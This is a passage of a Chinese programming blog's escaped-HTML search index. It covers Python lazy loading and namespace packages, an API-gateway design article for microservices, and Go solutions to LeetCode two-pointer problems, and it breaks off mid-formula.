&lt;p&gt;在这个版本中，类A和类B被替换为在第一次访问时加载所需的类的函数。对于用户，这看起来不会有太大的不同。 例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import mymodule
&amp;gt;&amp;gt;&amp;gt; a = mymodule.A()
&amp;gt;&amp;gt;&amp;gt; a.spam()
A.spam
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;延迟加载的主要缺点是继承和类型检查可能会中断。你可能会稍微改变你的代码，例如:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if isinstance(x, mymodule.A): # Error
...

if isinstance(x, mymodule.a.A): # Ok
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;延迟加载的真实例子, 见标准库 &lt;code&gt;multiprocessing/__init__.py&lt;/code&gt; 的源码.&lt;/p&gt;
&lt;h2 id=&#34;5-利用命名空间导入目录分散的代码&#34;&gt;5 利用命名空间导入目录分散的代码&lt;/h2&gt;
&lt;p&gt;你可能有大量的代码，由不同的人来分散地维护。每个部分被组织为文件目录，如一个包。然而，你希望能用共同的包前缀将所有组件连接起来，不是将每一个部分作为独立的包来安装。&lt;/p&gt;
&lt;p&gt;从本质上讲，你要定义一个顶级Python包，作为一个大集合分开维护子包的命名空间。这个问题经常出现在大的应用框架中，框架开发者希望鼓励用户发布插件或附加包。&lt;/p&gt;
&lt;p&gt;在统一不同的目录里统一相同的命名空间，但是要删去用来将组件联合起来的&lt;code&gt;__init__.py&lt;/code&gt;文件。假设你有Python代码的两个不同的目录如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;foo-package/
    spam/
        blah.py

bar-package/
    spam/
        grok.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这2个目录里，都有着共同的命名空间spam。在任何一个目录里都没有&lt;code&gt;__init__.py&lt;/code&gt;文件。&lt;/p&gt;
&lt;p&gt;让我们看看，如果将foo-package和bar-package都加到python模块路径并尝试导入会发生什么&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import sys
&amp;gt;&amp;gt;&amp;gt; sys.path.extend([&#39;foo-package&#39;, &#39;bar-package&#39;])
&amp;gt;&amp;gt;&amp;gt; import spam.blah
&amp;gt;&amp;gt;&amp;gt; import spam.grok
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;两个不同的包目录被合并到一起，你可以导入spam.blah和spam.grok，并且它们能够工作。&lt;/p&gt;
&lt;h3 id=&#34;讨论-5&#34;&gt;讨论&lt;/h3&gt;
&lt;p&gt;在这里工作的机制被称为“包命名空间”的一个特征。从本质上讲，包命名空间是一种特殊的封装设计，为合并不同的目录的代码到一个共同的命名空间。对于大的框架，这可能是有用的，因为它允许一个框架的部分被单独地安装下载。它也使人们能够轻松地为这样的框架编写第三方附加组件和其他扩展。&lt;/p&gt;
&lt;p&gt;包命名空间的关键是确保顶级目录中没有&lt;code&gt;__init__.py&lt;/code&gt;文件来作为共同的命名空间。缺失&lt;code&gt;__init__.py&lt;/code&gt;文件使得在导入包的时候会发生有趣的事情：这并没有产生错误，解释器创建了一个由所有包含匹配包名的目录组成的列表。特殊的包命名空间模块被创建，只读的目录列表副本被存储在其&lt;code&gt;__path__&lt;/code&gt;变量中。 举个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import spam
&amp;gt;&amp;gt;&amp;gt; spam.__path__
_NamespacePath([&#39;foo-package/spam&#39;, &#39;bar-package/spam&#39;])
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在定位包的子组件时，目录&lt;code&gt;__path__&lt;/code&gt;将被用到(例如, 当导入spam.grok或者spam.blah的时候).&lt;/p&gt;
&lt;p&gt;包命名空间的一个重要特点是任何人都可以用自己的代码来扩展命名空间。举个例子，假设你自己的代码目录像这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;my-package/
    spam/
        custom.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果你将你的代码目录和其他包一起添加到sys.path，这将无缝地合并到别的spam包目录中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import spam.custom
&amp;gt;&amp;gt;&amp;gt; import spam.grok
&amp;gt;&amp;gt;&amp;gt; import spam.blah
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一个包是否被作为一个包命名空间的主要方法是检查其__file__属性。如果没有，那包是个命名空间。这也可以由其字符表现形式中的“namespace”这个词体现出来。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; spam.__file__
Traceback (most recent call last):
    File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
AttributeError: &#39;module&#39; object has no attribute &#39;__file__&#39;
&amp;gt;&amp;gt;&amp;gt; spam
&amp;lt;module &#39;spam&#39; (namespace)&amp;gt;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;更多的包命名空间信息可以查看 [PEP 420](https://www.python.org/dev/peps/pep-0420/。&lt;/p&gt;
">【python】模块和包管理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/wei-fu-wu-api-wang-guan/"" data-c="
          &lt;p&gt;当选择将应用构建成为一组微服务时，需要决定应用客户端将如何与微服务进行交互。单体应用只有一组端点（endpoint），通常使用副本（replicated）结合负载均衡来分配流量。&lt;/p&gt;
&lt;p&gt;在微服务架构中，通常每个微服务都暴露一组比较细颗粒的端点。&lt;/p&gt;
&lt;h2 id=&#34;怎么访问微服务&#34;&gt;怎么访问微服务&lt;/h2&gt;
&lt;p&gt;例如一个购物应用软件，在展示产品的详细页面：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://872026152-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LAinv8dInYi41sSnmWu%2F-LAinzxGnqu1h1CS4HMv%2F-LAio20Stat_P81ysFrM%2F2-1.png?generation=1524425066238330&amp;amp;alt=media&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;产品详细信息页面展示了许多信息，不仅有基本的产品信息，如名称、描述和价格，还有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;购物车中的物品数量&lt;/li&gt;
&lt;li&gt;订单历史&lt;/li&gt;
&lt;li&gt;客户评价&lt;/li&gt;
&lt;li&gt;低库存警告&lt;/li&gt;
&lt;li&gt;配送选项&lt;/li&gt;
&lt;li&gt;各种推荐，包括了购买此产品的客户购买的其他产品&lt;/li&gt;
&lt;li&gt;选择性购买选项&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在使用单体应用架构的情况下，移动客户端通过对应用进行单个 REST 调用来检索此数据，例如：&lt;code&gt;GET api.company.com/productdetails/productId&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;负载均衡器将请求路由到几个相同应用实例中的其中一个。之后，应用查询各个数据库表并返回响应给客户端。相比之下，当使用微服务架构时，产品详细页面上展示的数据来自多个微服务。以下是一些产品详细信息数据可能涉及到的微服务：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;订单服务&lt;/strong&gt; — 订单历史&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目录（catalog）服务&lt;/strong&gt; — 基本的产品信息，如产品名称、图片和价格&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;评价服务&lt;/strong&gt; — 客户评价&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;库存服务&lt;/strong&gt; — 低库存警告&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;配送服务&lt;/strong&gt; — 配送选项、期限和费用，由配送方的 API 单独提供&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;推荐服务&lt;/strong&gt; — 推荐类目&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://872026152-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LAinv8dInYi41sSnmWu%2F-LAinzxGnqu1h1CS4HMv%2F-LAio23gpF108R6KhnYZ%2F2-2.png?generation=1524425096893543&amp;amp;alt=media&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;因此我们需要去让客户端访问这些服务。&lt;/p&gt;
&lt;h2 id=&#34;客户端与微服务通信方式&#34;&gt;客户端与微服务通信方式&lt;/h2&gt;
&lt;h3 id=&#34;直接通信&#34;&gt;直接通信&lt;/h3&gt;
&lt;p&gt;理论上，客户端可以直接向每个微服务发送请求。每个微服务都有一个公开的端点：&lt;code&gt;https://serviceName.api.company.name&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;该 URL 将映射到用于跨可用实例分发请求的微服务负载均衡器。为了检索特定的产品页面信息，移动客户端将向上述的每个微服务发送请求。&lt;/p&gt;
&lt;p&gt;但是这种方式存在问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一个问题是客户端的需求与每个微服务暴露的细粒度的 API 不匹配。在此示例中，客户端需要进行七次单独的请求。如果在更加复杂的应用中，它可能需要做更多的工作。例如，Amazon 的产品页面渲染牵涉到数百个微服务。虽然客户端可以通过 LAN 发送许多请求，但在公共互联网下效率已经低下，在移动网络必然是不切实际。&lt;/li&gt;
&lt;li&gt;客户端直接调用微服务的另一个问题是有些服务可能使用了非 web 友好协议。一个服务可能使用了 Thrift 二进制 RPC，而另一个则可能使用 AMQP 消息协议。这两个协议无论是对浏览器还是防火墙来说都是不友好的，最好是在内部使用。应用在防火墙之外应该使用 HTTP 或者 WebSocket 之类的协议。&lt;/li&gt;
&lt;li&gt;另外这种方法它难以重构微服务。随着时间推移，我们可能会想改变系统划分服务。例如，我们可能会合并两个服务或者将服务拆分为两个或者多个。然而，如果客户端直接与服务进行通信，实施这类的重构将变得非常困难。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;由于存在这些问题，很少有客户端直接与微服务进行通信。&lt;/p&gt;
&lt;h3 id=&#34;使用-api-网关&#34;&gt;使用 API 网关&lt;/h3&gt;
&lt;p&gt;通常更好的方式是使用 API 网关。API 网关是一个服务器，是系统的单入口点。它类似于面向对象设计模式中的门面（Facade）模式。API 网关封装了内部系统架构，并针对每个客户端提供一个定制 API。它还可用于&lt;strong&gt;认证、监控、负载均衡、缓存和静态响应处理&lt;/strong&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://872026152-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LAinv8dInYi41sSnmWu%2F-LAinzxGnqu1h1CS4HMv%2F-LAio26eO3Q8M2XZzilg%2F2-3.png?generation=1524425104645261&amp;amp;alt=media&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;API 网关负责请求路由、组合和协议转换。所有客户端请求首先要通过 API 网关，之后请求被路由到适当的服务。API 网关通常会通过调用多个微服务来处理一个请求并聚合结果。它可以在 Web 协议（如 HTTP 和 WebSocket）和用于内部的非 Web 友好协议之间进行转换。&lt;/p&gt;
&lt;p&gt;API 网关还可以为每个客户端提供一个定制 API。它通常会为移动客户端暴露一个粗粒度的 API。例如，考虑一下产品详细信息场景，API 网关可以提供一个端点 &lt;code&gt;/productdetails?productid=xxx&lt;/code&gt;，（如上图所示，一个使用了 API 网关的微服务）允许移动客户端通过一个单独的请求来检索所有产品详细信息。API 网关通过调用各种服务（产品信息、推荐、评价等）并组合结果。&lt;/p&gt;
&lt;h2 id=&#34;api-网关的优点与缺点&#34;&gt;API 网关的优点与缺点&lt;/h2&gt;
&lt;p&gt;正如你所料，使用 API 网关同样存在好处与坏处。使用 API 网关的主要好处是它封装了应用的内部结构。客户端只需要与网关通信，而不必调用特定的服务。API 网关为每种类型的客户端提供了特定的 API，减少了客户端与应用之间的往返次数。同时，它还简化了客户端的代码。&lt;/p&gt;
&lt;p&gt;API 网关也存在一些缺点，它本身也是一个高度可用的组件，需要开发、部署和管理。另外，还有一个风险是 API 网关可能会成为开发瓶颈。开发人员必须更新 API 网关来暴露每个微服务的端点。&lt;/p&gt;
&lt;p&gt;重要的是更新 API 网关的过程应尽可能地放缓一些。否则，开发人员将被迫排队等待网关更新。尽管 API 网关存在这些缺点，但对于大多数的真实应用来说，使用 API 网关是正确的。&lt;/p&gt;
&lt;h2 id=&#34;实现-api-网关&#34;&gt;实现 API 网关&lt;/h2&gt;
&lt;p&gt;我们已经了解了使用 API 网关的动机和利弊，接下来让我们看看你需要考虑的各种设计问题。&lt;/p&gt;
&lt;h3 id=&#34;性能与可扩展性&#34;&gt;性能与可扩展性&lt;/h3&gt;
&lt;p&gt;只有少数公司能达到 Netflix 的运营规模，每天需要处理数十亿的请求。不管怎样，对于大多数应用来说，API 网关的性能和可扩展性是相当重要的。因此，在一个支持异步、非阻塞 I/O 平台上构建 API 网关是很有必要的。实现一个可扩展的 API 网关的技术多种多样。在 JVM 上，你可以使用基于 NIO 的框架，如 Netty、Vertx、Spring Reactor 或者 JBoss Undertow。一个流行的非 JVM 选择是使用 Node.js，它是一个建立在 Chrome 的 JavaScript 引擎之上的平台。此外，你还可以选择使用 NGINX Plus。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.nginx.com/solutions/api-gateway/&#34;&gt;NGINX Plus&lt;/a&gt; 提供了一个成熟、可扩展和高性能的 Web 服务器和反向代理，它易于部署、配置和编程。NGINX Plus 可以管理身份验证、访问控制、负载均衡请求、缓存响应，并且提供了应用健康检查和监控功能。&lt;/p&gt;
&lt;h3 id=&#34;使用响应式编程模型&#34;&gt;使用响应式编程模型&lt;/h3&gt;
&lt;p&gt;API 网关处理大部分请求只是简单的把它们路由到与之对应的后端服务。它通过调用多个后端服务来处理其他请求并聚合结果。对于某些请求，如产品详细信息请求，对后端服务请求而言是彼此独立的。为了把响应时间缩短到最小，API 网关应该并发执行独立请求。&lt;/p&gt;
&lt;p&gt;然而，有时候，请求是相互依赖的。首先，API 网关可能需要在将请求路由到后端服务之前，通过调用验证服务来验证该请求。同样，为了从客户的愿望清单中获取产品信息，API 网关首先必须检索包含该信息的客户资料，然后检索每个产品的信息。还有一个有趣的 API 组合案例是 &lt;a href=&#34;http://techblog.netflix.com/2013/02/rxjava-netflix-api.html&#34;&gt;Netflix 视频网格&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;使用传统的异步回调方式来编写 API 组合代码会很快使你陷入回调地狱。代码将会变得杂乱、难以理解并且容易出错。更好的方式是使用响应式方法以声明式方式编写 API 网关代码。响应式抽象的例子包括 Scala 的 &lt;a href=&#34;http://docs.scala-lang.org/overviews/core/futures.html&#34;&gt;Future&lt;/a&gt;、Java 8 中的 &lt;a href=&#34;https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/CompletableFuture.html&#34;&gt;CompletableFuture&lt;/a&gt; 和 JavaScript 中的 &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise&#34;&gt;Promise&lt;/a&gt;。还有 &lt;a href=&#34;http://reactivex.io&#34;&gt;Reactive Extensions&lt;/a&gt;（也称为 Rx 或 ReactiveX），最初由 Microsoft 为 .NET 平台开发。Netflix 为 JVM 创建了 RxJava，专门应用在它的 API 网关。还有用于 JavaScript 的 RxJS，它可以在浏览器和 Node.js 中运行。使用响应式可让你能够编写出简单而高效的 API 网关代码。&lt;/p&gt;
&lt;h3 id=&#34;服务调用&#34;&gt;服务调用&lt;/h3&gt;
&lt;p&gt;基于微服务的应用是一个分布式系统，必须使用进程间（inter-process）通信机制。有两种进程间通信方案。一是使用基于消息的&lt;strong&gt;异步机制&lt;/strong&gt;。某些实现采用了消息代理，如 JMS 和 AMQP。其他采用无代理的方式直接与服务通信，如 Zeromq。&lt;/p&gt;
&lt;p&gt;另一种类型的进程间通信采用了&lt;strong&gt;同步机制&lt;/strong&gt;，如 HTTP 和 Thrift(RPC框架)。系统通常会同时使用异步和同步方式。甚至可以为每种方式应用多个实现。因此，API 网关需要支持各种通信机制。&lt;/p&gt;
&lt;h3 id=&#34;服务发现&#34;&gt;服务发现&lt;/h3&gt;
&lt;p&gt;API 网关需要知道与其通信的每个微服务的位置（IP 地址和端口）。在传统应用中，你可以将这些位置硬编码，但在现代基于云的微服务应用中，找到所需的位置不是一件简单的事情。&lt;/p&gt;
&lt;p&gt;基础设施服务（比如消息代理）通常都有一个可以通过系统环境变量来指定的静态位置。但是，要确定应用服务的位置并不是那么容易。&lt;/p&gt;
&lt;p&gt;应用服务可以动态分配位置。此外，由于自动扩缩和升级，一个服务的整组实例可以动态变更。因此，API 网关与系统中的任何其他服务客户端一样，需要使用系统的服务发现机制：&lt;a href=&#34;http://microservices.io/patterns/server-side-discovery.html&#34;&gt;服务端发现&lt;/a&gt;或&lt;a href=&#34;http://microservices.io/patterns/client-side-discovery.html&#34;&gt;客户端发现&lt;/a&gt;。&lt;a href=&#34;&#34;&gt;第四章&lt;/a&gt;中更详细地描述了服务发现。现在需要注意的是，如果系统使用客户端发现，API 网关必须能够查询&lt;a href=&#34;http://microservices.io/patterns/service-registry.html&#34;&gt;服务注册中心&lt;/a&gt;，注册中心是所有微服务实例及其位置的数据库。&lt;/p&gt;
&lt;h3 id=&#34;处理局部故障&#34;&gt;处理局部故障&lt;/h3&gt;
&lt;p&gt;实现 API 网关时必须解决的另一个问题是局部故障问题。当一个服务调用另一个响应缓慢或者不可用的服务时，所有分布式系统都会出现此问题。API 网关不应该无期限地等待下游服务。但是，如何处理故障取决于特定的方案和哪些服务发生故障。例如，如果推荐服务在获取产品详细信息时没有响应，API 网关应将其余的产品详细信息返回给客户端，因为这些信息对用户仍然有用。建议可以是空的，也可以用其它内容代替，例如硬编码的十强排行名单。然而，如果产品信息服务没有响应，那么 API 网关应该向客户端返回错误。&lt;/p&gt;
&lt;p&gt;如果可以，API 网关还可以返回缓存数据。例如，由于产品价格变化不大，当价格服务不可用时，API 网关可以返回被缓存的价格数据。数据可以由 API 网关缓存或存储在外部缓存中，如 Redis 或 Memcached。API 网关通过返回默认数据或缓存数据，确保系统发生故障时最小程度上影响到用户体验。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Netflix/Hystrix&#34;&gt;Netflix Hystrix&lt;/a&gt; 是一个非常有用的库，用于编写调用远程服务代码。Hystrix 可以使超出指定阈值的调用超时。它实现了断路器模式，防止客户端不必要地等待无响应的服务。如果服务的错误率超过指定阈值，Hystrix 将会跳闸，所有请求将在指定的时间内立即失败。Hystrix 允许你在请求失败时定义回退操作，例如从缓存读取或返回默认值。如果你正在使用 JVM，那么你一定要考虑使用 Hystrix。如果你是在非 JVM 环境中运行，则应使用相同功能的库。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;对于大多数基于微服务的应用来说，实现一个 API 网关是很有必要的，API 网关作为系统的单入口点，并且负责请求路由，组合和协议转换。它为每个应用客户端提供了一个自定义 API。API 网关还可以通过返回缓存或默认数据来掩盖后端服务故障。在下一章中，我们将介绍服务间的通信。&lt;/p&gt;
">微服务API网关</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/k8s-01-he-xin-ji-zhu/"" data-c="
          &lt;p&gt;--&lt;/p&gt;
">【k8s】核心技术</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-shuang-zhi-zhen/"" data-c="
          &lt;h2 id=&#34;双指针&#34;&gt;双指针&lt;/h2&gt;
&lt;h3 id=&#34;移除元素&#34;&gt;移除元素&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-element/&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684468855.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func removeElement(nums []int, val int) int {
    var end int = len(nums) - 1
    var start int = 0

    for start &amp;lt;= end {
        for nums[start] == val &amp;amp;&amp;amp; start &amp;lt;= end {
            nums[start] = nums[end]
            end--
        }
        start ++
    }

    return end + 1
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;剑指offer-05替换空格&#34;&gt;剑指Offer 05.替换空格&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func replaceSpace(s string) string {
    s2byte := make([]byte, len(s))
    emptycnt := 0
    for i := 0; i &amp;lt; len(s); i++ {
        if s[i] == &#39; &#39; {
            emptycnt ++
        }
    }

    for emptycnt &amp;gt; 0 {
        emptycnt --
        s2byte = append(s2byte, &#39; &#39;, &#39; &#39;)
    }

    for i, j := len(s)-1, len(s2byte)-1; i &amp;gt;= 0; {
        if s[i] == &#39; &#39; {
            s2byte[j] = &#39;0&#39;
            s2byte[j-1] = &#39;2&#39;
            s2byte[j-2] = &#39;%&#39;
            j -= 3
        } else {
            s2byte[j] = s[i]
            j --
        }
        i --
    }
    res := string(s2byte)
    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;移除元素-2&#34;&gt;移除元素&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-element/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/*
因为不要求元素按照之前的排列，所以可以使用双指针，一个指针从前往后用来扫描数组，另一个指针从后往前将后面的元素添加到删除元素后的空位
*/
func removeElement(nums []int, val int) int {
    var end int = len(nums) - 1
    var start int = 0

    for start &amp;lt;= end {
        for nums[start] == val &amp;amp;&amp;amp; start &amp;lt;= end {
            nums[start] = nums[end]
            end--
        }
        start ++
    }

    return end + 1
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;三数之和&#34;&gt;三数之和&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/3sum/&lt;/p&gt;
&lt;p&gt;方式是先对数组进行排序，然后通过双重循环，外层i遍历整个数组，内层通过双指针&lt;code&gt;left=i+1, right=len-1&lt;/code&gt;&lt;br&gt;
如果三数之和大于0，则&lt;code&gt;left++&lt;/code&gt;&lt;br&gt;
如果三数之和小于0，则&lt;code&gt;right--&lt;/code&gt;&lt;br&gt;
因为不能有重复的答案，i和left都需要看是不是和上一个元素相同&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import (
    &amp;quot;sort&amp;quot;
)
func threeSum(nums []int) [][]int {
    res := make([][]int, 0)
    var left, right, length int
    length = len(nums)
    sort.Ints(nums)
    for i := 0; i &amp;lt; length; i++ {
        if i &amp;gt; 0 &amp;amp;&amp;amp; nums[i] == nums[i-1] {
            continue
        }
        left = i + 1
        right = length - 1
        for left &amp;lt; right {
            if left &amp;gt; i + 1 &amp;amp;&amp;amp; nums[left] == nums[left-1] {
                left ++
                continue
            }
            if nums[i] + nums[left] + nums[right] &amp;gt; 0 {
                right --
            } else if nums[i] + nums[left] + nums[right] &amp;lt; 0 {
                left ++
            } else {
                res = append(res, []int{nums[i], nums[left], nums[right]})
                left ++
            }
        }
    }
    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;四数之和&#34;&gt;四数之和&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/4sum/&lt;/p&gt;
&lt;p&gt;和三数之和类似，只是多加了一层循环&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import &amp;quot;sort&amp;quot;
func fourSum(nums []int, target int) [][]int {
    sort.Ints(nums)
    ans := make([][]int, 0)
    llen := len(nums)
    for i := 0; i &amp;lt; llen; i++ {
        if i &amp;gt; 0 &amp;amp;&amp;amp; nums[i] == nums[i - 1] {
            continue
        }
        for j := i + 1; j &amp;lt; llen; j++ {
            if j &amp;gt; i + 1 &amp;amp;&amp;amp; nums[j] == nums[j - 1] {
                continue
            }
            left := j + 1
            right := llen - 1
            for left &amp;lt; right {
                if left &amp;gt; j + 1 &amp;amp;&amp;amp; nums[left] == nums[left - 1] {
                    left ++
                    continue
                }
                if nums[i] + nums[j] + nums[left] + nums[right] &amp;gt; target {
                    right --
                } else if nums[i] + nums[j] + nums[left] + nums[right] &amp;lt; target {
                    left ++
                } else {
                    ans = append(ans, []int{nums[i], nums[j], nums[left], nums[right]})
                    left ++
                }
            }
        }
    }
    return ans
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;反转字符串里的单词&#34;&gt;反转字符串里的单词&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/reverse-words-in-a-string/&lt;/p&gt;
&lt;p&gt;首先将字符串中的多余空格去，可以使用https://leetcode-cn.com/problems/remove-element/里的思想，然后将整个字符串逆序，然后再将字符串的每个单词进行反转就可以了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 直接使用内置函数，这种方式就是熟悉一下go中的字符串操作还可以
import &amp;quot;strings&amp;quot;

func reverse(strsplit []string) []string {
    for i, j := 0, len(strsplit)-1; i &amp;lt; j; i, j = i+1, j-1 {
        strsplit[i], strsplit[j] = strsplit[j], strsplit[i]
    }
    return strsplit
}

func reverseWords(s string) string {
    splitstr := reverse(strings.Fields(s))
    return strings.Join(splitstr, &amp;quot; &amp;quot;)
}


// 第二种方式就是上面说的
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;链表相交&#34;&gt;链表相交※&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci/&lt;/p&gt;
&lt;p&gt;思路就是先求出两个链表的长度，求出两链表的差值，然后先让长的链表移动差值步，然后二者一块移动看指针是否相同。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func getIntersectionNode(headA, headB *ListNode) *ListNode {
    
    i, j := 0, 0

    tmp := headA
    for tmp != nil {
        tmp = tmp.Next
        i ++
    }

    tmp = headB
    for tmp != nil {
        tmp = tmp.Next
        j ++
    }

    var tmp1, tmp2 *ListNode
    var k int

    if i &amp;gt; j {
        tmp1 = headA
        tmp2 = headB
        k = i - j
    } else {
        tmp1 = headB
        tmp2 = headA
        k = j - i
    }

    for k &amp;gt; 0 {
        k-- 
        tmp1 = tmp1.Next
    }

    for tmp1 != tmp2 {
        tmp1 = tmp1.Next
        tmp2 = tmp2.Next
    }

    return tmp1

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;环形链表ii&#34;&gt;环形链表Ⅱ※&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/linked-list-cycle-ii/&lt;/p&gt;
&lt;p&gt;设置快慢指针，快指针一次走两步，慢指针一次走一步，二者相遇时一定是在环内，假设头节点到环的入口距离为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，入口到快慢指针相遇的位置距离为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;y&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，从相遇位置到环入口位置距离为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; 